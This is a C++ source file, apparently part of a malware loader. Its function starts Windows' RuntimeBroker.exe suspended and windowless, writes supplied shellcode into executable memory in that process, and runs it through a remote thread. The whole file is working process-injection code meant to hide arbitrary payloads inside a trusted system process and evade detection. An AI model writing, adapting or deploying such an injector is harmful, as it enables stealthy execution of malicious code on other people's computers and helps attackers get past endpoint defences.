#include "process_hollowing.h"
#include <iostream>
#include <windows.h>
#include "config.h"

bool InjectShellcode(const BYTE* shellcode, SIZE_T shellcodeSize) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);

    const char* targetProcess = "C:\\Windows\\System32\\RuntimeBroker.exe";
    if (!CreateProcessA(NULL, (LPSTR)targetProcess, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DEBUG_PRINT("[-] CreateProcess failed: " << GetLastError() << std::endl);
        return false;
    }
    DEBUG_PRINT("[+] Target process created successfully. Process ID: " << pi.dwProcessId << std::endl);

    LPVOID execMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        DEBUG_PRINT("[-] VirtualAllocEx failed: " << GetLastError() << std::endl);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    DEBUG_PRINT("[+] Memory allocated in the target process at address: " << execMem << std::endl);

    if (!WriteProcessMemory(pi.hProcess, execMem, shellcode, shellcodeSize, NULL)) {
        DEBUG_PRINT("[-] WriteProcessMemory failed: " << GetLastError() << std::endl);
        VirtualFreeEx(pi.hProcess, execMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    DEBUG_PRINT("[+] Shellcode written to memory successfully." << std::endl);

    HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);
    if (!hThread) {
        DEBUG_PRINT("[-] CreateRemoteThread failed: " << GetLastError() << std::endl);
        VirtualFreeEx(pi.hProcess, execMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    DEBUG_PRINT("[+] Remote thread created successfully. Thread ID: " << GetThreadId(hThread) << std::endl);

    if (ResumeThread(pi.hThread) == -1) {
        DEBUG_PRINT("[-] ResumeThread failed: " << GetLastError() << std::endl);
        CloseHandle(hThread);
        VirtualFreeEx(pi.hProcess, execMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    DEBUG_PRINT("[+] Main thread of the target process resumed." << std::endl);

    CloseHandle(hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}
